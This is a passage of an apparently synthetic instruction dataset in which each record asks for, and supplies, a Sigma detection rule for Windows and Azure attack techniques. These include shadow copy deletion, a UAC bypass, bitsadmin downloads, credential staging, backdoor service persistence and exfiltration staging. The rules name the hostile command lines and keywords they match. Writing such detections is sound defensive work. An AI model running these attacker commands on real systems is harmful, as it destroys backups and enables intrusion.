    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via RUNDLL LAUNCHER.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated PowerShell via RUNDLL launcher, you should focus on monitoring Windows PowerShell modules. Specifically, look for events that include the execution of 'rundll32.exe' in conjunction with 'shell32.dll' and the specific command 'shellexec_rundll', which is often used to obfuscate the launching of PowerShell scripts. This method of execution is noteworthy as attackers frequently use it to bypass detection mechanisms by masking malicious PowerShell activity. The detection hinges on identifying these components together within the PowerShell module logs, marked under a unique definition ID. It's crucial to be aware that while this approach is effective for uncovering suspicious activities, there may be instances where legitimate applications trigger similar patterns, and these should be carefully considered as potential false positives. The severity of this detection is classified as medium, signifying the need for prompt investigation upon alert. This method is aligned with recognized cyber attack tactics and techniques, aiding in the broader strategy of defense against advanced threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - 'rundll32.exe'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n            - 'powershell'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|contains|all:\n            - 'rundll32.exe'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n            - 'powershell'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Obfuscated Powershell via RUNDLL LAUNCHER",
      "answer": "In order to detect obfuscated PowerShell via RUNDLL launcher, you should focus on monitoring Windows PowerShell modules. Specifically, look for events that include the execution of 'rundll32.exe' in conjunction with 'shell32.dll' and the specific command 'shellexec_rundll', which is often used to obfuscate the launching of PowerShell scripts. This method of execution is noteworthy as attackers frequently use it to bypass detection mechanisms by masking malicious PowerShell activity. The detection hinges on identifying these components together within the PowerShell module logs, marked under a unique definition ID. It's crucial to be aware that while this approach is effective for uncovering suspicious activities, there may be instances where legitimate applications trigger similar patterns, and these should be carefully considered as potential false positives. The severity of this detection is classified as medium, signifying the need for prompt investigation upon alert. This method is aligned with recognized cyber attack tactics and techniques, aiding in the broader strategy of defense against advanced threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of cmdkey to add generic credentials. As an example, this has to be used before connecting to an RDP session via command line interface..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of cmdkey to add generic credentials, which is a common preparation step before connecting to an RDP session via command line interface, you should: Monitor for process creation events on Windows systems, specifically looking for the execution of 'cmdkey.exe'. Pay close attention when the command line for 'cmdkey.exe' includes the parameters '/g' (generic credential), '/u' (user), and '/p' (password). This unusual combination of parameters suggests an attempt to add generic credentials, and while it can be a legitimate administrative action, it could also indicate malicious activity aiming to establish persistence or facilitate lateral movement within a network. It's critical to evaluate these incidents in the context of other related activity on the system to distinguish between benign and suspicious uses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /g'\n            - ' /u'\n            - ' /p'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /g'\n            - ' /u'\n            - ' /p'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium\n",
      "question": "usage of cmdkey to add generic credentials. As an example, this has to be used before connecting to an RDP session via command line interface.",
      "answer": "In order to detect usage of cmdkey to add generic credentials, which is a common preparation step before connecting to an RDP session via command line interface, you should: Monitor for process creation events on Windows systems, specifically looking for the execution of 'cmdkey.exe'. Pay close attention when the command line for 'cmdkey.exe' includes the parameters '/g' (generic credential), '/u' (user), and '/p' (password). This unusual combination of parameters suggests an attempt to add generic credentials, and while it can be a legitimate administrative action, it could also indicate malicious activity aiming to establish persistence or facilitate lateral movement within a network. It's critical to evaluate these incidents in the context of other related activity on the system to distinguish between benign and suspicious uses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34), you should monitor for process creation events on Windows systems. Specifically, look for instances where the command line ends with \"\\system32\\cleanmgr.exe /autoclean /d C:\", originating from a parent process with the command line \"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\". Additionally, these processes must be running with either high integrity levels or system integrity levels. This behavior is indicative of attempts to bypass User Account Control (UAC) using a technique involving scheduled tasks and the exploitation of the Windows cleanmgr.exe utility. Be aware that detections of this nature are considered high-level threats, although it is acknowledged that there could be unknown scenarios where this behavior might not indicate malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: '\"\\system32\\cleanmgr.exe /autoclean /d C:'\n        ParentCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: '\"\\system32\\cleanmgr.exe /autoclean /d C:'\n        ParentCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)",
      "answer": "In order to detect the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34), you should monitor for process creation events on Windows systems. Specifically, look for instances where the command line ends with \"\\system32\\cleanmgr.exe /autoclean /d C:\", originating from a parent process with the command line \"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\". Additionally, these processes must be running with either high integrity levels or system integrity levels. This behavior is indicative of attempts to bypass User Account Control (UAC) using a technique involving scheduled tasks and the exploitation of the Windows cleanmgr.exe utility. Be aware that detections of this nature are considered high-level threats, although it is acknowledged that there could be unknown scenarios where this behavior might not indicate malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential preparation for data exfiltration using tunneling techniques, particularly through the installation of well-known TAP software, you should focus on monitoring Windows security event logs. Specifically, it is crucial to ensure that the 'System Security Extension' audit subcategory is enabled, which allows for the logging of Event ID (EID) 4697. This event ID is significant as it is recorded when a service is installed on the system. An important indicator of suspicious activity is when the service file name associated with the event contains 'tap0901', which is commonly linked to OpenVPN TAP installations.\n\nIt's essential to pay attention to this activity because, while OpenVPN's TAP driver installation is a legitimate action in many contexts, it can be misused in this scenario for setting up a tunneling mechanism that attackers could leverage for data exfiltration. Consequently, any detection of an EID 4697 event with 'tap0901' in the service file name should be carefully investigated. However, it's also important to consider the possibility of false positives, particularly in environments where the OpenVPN TAP installation is expected and legitimate.\n\nThis monitoring strategy aligns with the tactics and techniques associated with Command and Control and Exfiltration, which involve the establishment of communication channels and the movement of data out of a target network in a manner that evades detection. This approach not only helps in identifying potential threats but also aids in understanding the context of their operations, allowing for more effective responses to prevent data breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains: 'tap0901'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains: 'tap0901'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\n",
      "question": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
      "answer": "In order to detect potential preparation for data exfiltration using tunneling techniques, particularly through the installation of well-known TAP software, you should focus on monitoring Windows security event logs. Specifically, it is crucial to ensure that the 'System Security Extension' audit subcategory is enabled, which allows for the logging of Event ID (EID) 4697. This event ID is significant as it is recorded when a service is installed on the system. An important indicator of suspicious activity is when the service file name associated with the event contains 'tap0901', which is commonly linked to OpenVPN TAP installations.\n\nIt's essential to pay attention to this activity because, while OpenVPN's TAP driver installation is a legitimate action in many contexts, it can be misused in this scenario for setting up a tunneling mechanism that attackers could leverage for data exfiltration. Consequently, any detection of an EID 4697 event with 'tap0901' in the service file name should be carefully investigated. However, it's also important to consider the possibility of false positives, particularly in environments where the OpenVPN TAP installation is expected and legitimate.\n\nThis monitoring strategy aligns with the tactics and techniques associated with Command and Control and Exfiltration, which involve the establishment of communication channels and the movement of data out of a target network in a manner that evades detection. This approach not only helps in identifying potential threats but also aids in understanding the context of their operations, allowing for more effective responses to prevent data breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Uninstall an application with wmic.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to uninstall an application with wmic, you should: Monitor process creation logs on Windows systems for instances where the WMIC (Windows Management Instrumentation Command-line) utility is invoked. Specifically, look for processes where the image name ends with '\\WMIC.exe' or the original file name matches 'wmic.exe'. Additionally, check the command line for the presence of the terms 'call' and 'uninstall'. This combination of image and command line monitoring helps in detecting attempts to use WMIC to uninstall applications, which could be indicative of malicious activity trying to remove security software or other important applications. Be aware that there may be legitimate uses of this technique, so unknown false positives could occur. The severity of this rule is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Uninstall an application with wmic",
      "answer": "In order to uninstall an application with wmic, you should: Monitor process creation logs on Windows systems for instances where the WMIC (Windows Management Instrumentation Command-line) utility is invoked. Specifically, look for processes where the image name ends with '\\WMIC.exe' or the original file name matches 'wmic.exe'. Additionally, check the command line for the presence of the terms 'call' and 'uninstall'. This combination of image and command line monitoring helps in detecting attempts to use WMIC to uninstall applications, which could be indicative of malicious activity trying to remove security software or other important applications. Be aware that there may be legitimate uses of this technique, so unknown false positives could occur. The severity of this rule is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when changes are made to PIM roles.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when changes are made to PIM roles, you should: monitor Azure audit logs for events that indicate an update to role settings in Privileged Identity Management (PIM). Specifically, look for audit log entries where the message includes \"Update role setting in PIM.\" It is important to note that legitimate administrative changes to PIM settings might trigger this detection, so validation is advised to differentiate between benign and malicious activities. The severity of such detections is considered high due to the potential impact on security posture if unauthorized changes are made.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Update role setting in PIM\n    condition: selection\nfalsepositives:\n    - Legit administrative PIM setting configuration changes\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Update role setting in PIM\n    condition: selection\nfalsepositives:\n    - Legit administrative PIM setting configuration changes\nlevel: high\n",
      "question": "when changes are made to PIM roles",
      "answer": "In order to detect when changes are made to PIM roles, you should: monitor Azure audit logs for events that indicate an update to role settings in Privileged Identity Management (PIM). Specifically, look for audit log entries where the message includes \"Update role setting in PIM.\" It is important to note that legitimate administrative changes to PIM settings might trigger this detection, so validation is advised to differentiate between benign and malicious activities. The severity of such detections is considered high due to the potential impact on security posture if unauthorized changes are made."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel and may also send the data to an alternate network location from the main command and control server, you should monitor Windows PowerShell Script Block Logging for specific script activities. Focus on scripts that contain the use of 'Send-MailMessage', which indicates an attempt to send data out, possibly as a form of data exfiltration. However, you will need to exclude any findings where 'CmdletsToExport' appears within the script block text, as this may represent legitimate script usage. Through this methodology, scripts that could potentially be used in data theft by sending information through unsecured email methods can be singled out, bearing in mind to carefully consider legitimate scripts that might similarly use sending email functionalities. The level of threat for this type of detection is considered medium, suggesting that while not foolproof, it's a valuable component of a layered defense approach.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Send-MailMessage'\n    filter:\n        ScriptBlockText|contains: 'CmdletsToExport'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Send-MailMessage'\n    filter:\n        ScriptBlockText|contains: 'CmdletsToExport'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate script\nlevel: medium\n",
      "question": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server.\n",
      "answer": "In order to detect adversaries who may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel and may also send the data to an alternate network location from the main command and control server, you should monitor Windows PowerShell Script Block Logging for specific script activities. Focus on scripts that contain the use of 'Send-MailMessage', which indicates an attempt to send data out, possibly as a form of data exfiltration. However, you will need to exclude any findings where 'CmdletsToExport' appears within the script block text, as this may represent legitimate script usage. Through this methodology, scripts that could potentially be used in data theft by sending information through unsecured email methods can be singled out, bearing in mind to carefully consider legitimate scripts that might similarly use sending email functionalities. The level of threat for this type of detection is considered medium, suggesting that while not foolproof, it's a valuable component of a layered defense approach."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Shadow Copies deletion using operating systems utilities.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts to delete Shadow Copies using operating systems utilities, you should monitor for process creation events on Windows systems where the process name ends with 'powershell.exe', 'pwsh.exe', 'wmic.exe', 'vssadmin.exe', diskshadow.exe', or 'wbadmin.exe'. Additionally, ensure to check the original filename for matches including 'PowerShell.EXE', 'pwsh.dll', 'wmic.exe', 'VSSADMIN.EXE', 'diskshadow.exe', and 'WBADMIN.EXE', which indicates the execution of these processes. Look for command line arguments which involve keywords such as 'shadow' and 'delete' together for powershell.exe, pwsh.exe, wmic.exe, vssadmin.exe, and diskshadow.exe, signifying attempts to delete shadow copies or modify shadow storage. For 'wbadmin.exe', ensure the command line contains 'delete', 'catalog', and 'quiet', which suggests an attempt to quietly delete backup catalogs. Furthermore, for 'vssadmin.exe', be alert for command line arguments that include 'resize', 'shadowstorage', along with 'unbounded' or '/MaxSize=', indicating an attempt to resize the shadow storage to a minimal or unspecified size, effectively removing shadow copies. It's important to capture both command line and parent command line inputs for a comprehensive analysis. Be aware of false positives, which may arise from legitimate administrative activities such as deliberate shadow copies deletion for system maintenance or specific software operations known to mimic this behavior. The threat level for this detection is high due to its association with tactics aimed at obstructing data recovery efforts and potentially facilitating ransomware attacks or other malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n            - '\\diskshadow.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'wmic.exe'\n            - 'VSSADMIN.EXE'\n            - 'diskshadow.exe'\n    selection1_cli:\n        CommandLine|contains|all:\n            - 'shadow'  # will match \"delete shadows\" and \"shadowcopy delete\" and \"shadowstorage\"\n            - 'delete'\n    selection2_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection2_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'catalog'\n            - 'quiet' # will match -quiet or /quiet\n    selection3_img:\n        - Image|endswith: '\\vssadmin.exe'\n        - OriginalFileName: 'VSSADMIN.EXE'\n    selection3_cli:\n        CommandLine|contains|all:\n            - 'resize'\n            - 'shadowstorage'\n        CommandLine|contains:\n            - 'unbounded'\n            - '/MaxSize='\n    condition: (all of selection1*) or (all of selection2*) or (all of selection3*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\n    - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n            - '\\diskshadow.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'wmic.exe'\n            - 'VSSADMIN.EXE'\n            - 'diskshadow.exe'\n    selection1_cli:\n        CommandLine|contains|all:\n            - 'shadow'  # will match \"delete shadows\" and \"shadowcopy delete\" and \"shadowstorage\"\n            - 'delete'\n    selection2_img:\n        - Image|endswith: '\\wbadmin.exe'\n        - OriginalFileName: 'WBADMIN.EXE'\n    selection2_cli:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'catalog'\n            - 'quiet' # will match -quiet or /quiet\n    selection3_img:\n        - Image|endswith: '\\vssadmin.exe'\n        - OriginalFileName: 'VSSADMIN.EXE'\n    selection3_cli:\n        CommandLine|contains|all:\n            - 'resize'\n            - 'shadowstorage'\n        CommandLine|contains:\n            - 'unbounded'\n            - '/MaxSize='\n    condition: (all of selection1*) or (all of selection2*) or (all of selection3*)\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\n    - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand)\nlevel: high\n",
      "question": "Shadow Copies deletion using operating systems utilities",
      "answer": "In order to detect attempts to delete Shadow Copies using operating systems utilities, you should monitor for process creation events on Windows systems where the process name ends with 'powershell.exe', 'pwsh.exe', 'wmic.exe', 'vssadmin.exe', diskshadow.exe', or 'wbadmin.exe'. Additionally, ensure to check the original filename for matches including 'PowerShell.EXE', 'pwsh.dll', 'wmic.exe', 'VSSADMIN.EXE', 'diskshadow.exe', and 'WBADMIN.EXE', which indicates the execution of these processes. Look for command line arguments which involve keywords such as 'shadow' and 'delete' together for powershell.exe, pwsh.exe, wmic.exe, vssadmin.exe, and diskshadow.exe, signifying attempts to delete shadow copies or modify shadow storage. For 'wbadmin.exe', ensure the command line contains 'delete', 'catalog', and 'quiet', which suggests an attempt to quietly delete backup catalogs. Furthermore, for 'vssadmin.exe', be alert for command line arguments that include 'resize', 'shadowstorage', along with 'unbounded' or '/MaxSize=', indicating an attempt to resize the shadow storage to a minimal or unspecified size, effectively removing shadow copies. It's important to capture both command line and parent command line inputs for a comprehensive analysis. Be aware of false positives, which may arise from legitimate administrative activities such as deliberate shadow copies deletion for system maintenance or specific software operations known to mimic this behavior. The threat level for this detection is high due to its association with tactics aimed at obstructing data recovery efforts and potentially facilitating ransomware attacks or other malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service creation persistence used by the Goofy Guineapig backdoor.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'GoogleUpdate'\n        ImagePath|contains|all:\n            - 'rundll32'\n            - 'FileProtocolHandler'\n            - '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'GoogleUpdate'\n        ImagePath|contains|all:\n            - 'rundll32'\n            - 'FileProtocolHandler'\n            - '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "service creation persistence used by the Goofy Guineapig backdoor",
      "answer": "In order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should: Monitor Windows process creation logs for the execution of the PowerShell command 'Compress-Archive' accompanied by the parameters '-Path' and '-DestinationPath', specifically when the destination path is set to the Windows temporary folder, denoted as '$env:TEMP\\'. This activity is commonly observed when adversaries utilize built-in system tools to compress data in preparation for exfiltration. They might aggregate sensitive files in a single archive, placing it in a temporary directory, making it easier to stealthily exfiltrate. Be aware that this behavior might lead to some false positives as it\u2019s not entirely unique to malicious activities. Thus, it's classified with a medium level of confidence. Identifying such activities falls under tactics and techniques such as Collection (gathering data of interest to their goal) and Exfiltration (stealing the data), although these specific terms are not used directly in the monitoring logic.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
      "answer": "In order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should: Monitor Windows process creation logs for the execution of the PowerShell command 'Compress-Archive' accompanied by the parameters '-Path' and '-DestinationPath', specifically when the destination path is set to the Windows temporary folder, denoted as '$env:TEMP\\'. This activity is commonly observed when adversaries utilize built-in system tools to compress data in preparation for exfiltration. They might aggregate sensitive files in a single archive, placing it in a temporary directory, making it easier to stealthily exfiltrate. Be aware that this behavior might lead to some false positives as it\u2019s not entirely unique to malicious activities. Thus, it's classified with a medium level of confidence. Identifying such activities falls under tactics and techniques such as Collection (gathering data of interest to their goal) and Exfiltration (stealing the data), although these specific terms are not used directly in the monitoring logic."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of WMIC in order to get a list of firewall and antivirus products.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of WMIC in order to get a list of firewall and antivirus products, you should: Monitor the creation of processes on Windows systems for events where the image ending matches '\\wmic.exe' or where the original file name is exactly 'wmic.exe'. Additionally, inspect the command line arguments for the presence of strings 'AntiVirusProduct' or 'FirewallProduct'. This detection is based on observing both the specific process being initiated and the nature of the command line instructions it's being given, aiming to catch attempts to enumerate installed security software through WMIC commands. The level of trust in these detections is medium, although it's noted that there could be scenarios (unknown at this time) where such activity could be legitimate.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'AntiVirusProduct'\n            - 'FirewallProduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'AntiVirusProduct'\n            - 'FirewallProduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of WMIC in order to get a list of firewall and antivirus products",
      "answer": "In order to detect the execution of WMIC in order to get a list of firewall and antivirus products, you should: Monitor the creation of processes on Windows systems for events where the image ending matches '\\wmic.exe' or where the original file name is exactly 'wmic.exe'. Additionally, inspect the command line arguments for the presence of strings 'AntiVirusProduct' or 'FirewallProduct'. This detection is based on observing both the specific process being initiated and the nature of the command line instructions it's being given, aiming to catch attempts to enumerate installed security software through WMIC commands. The level of trust in these detections is medium, although it's noted that there could be scenarios (unknown at this time) where such activity could be legitimate."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of bitsadmin downloading a file.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of bitsadmin downloading a file, you should: focus on monitoring process creation activities within Windows environments. Specifically, look for instances where the process image name ends with '\\bitsadmin.exe' or where the original file name is identified as 'bitsadmin.exe'. To further refine the detection, examine the command line for the presence of '/transfer', which is commonly used in file download commands. Additionally, check if the command line includes both '/create' and '/addfile' as part of its arguments, indicating the creation of a job and addition of a file to it. Another indicator of malicious activity is the inclusion of 'http' in the command line, suggesting the downloading of a file from the internet. It is important to capture both the command line and parent command line fields for analysis. While some legitimate applications may use bitsadmin in a similar manner, these instances are limited. The detection of such activities is considered to be of medium importance.",
    "context": "",
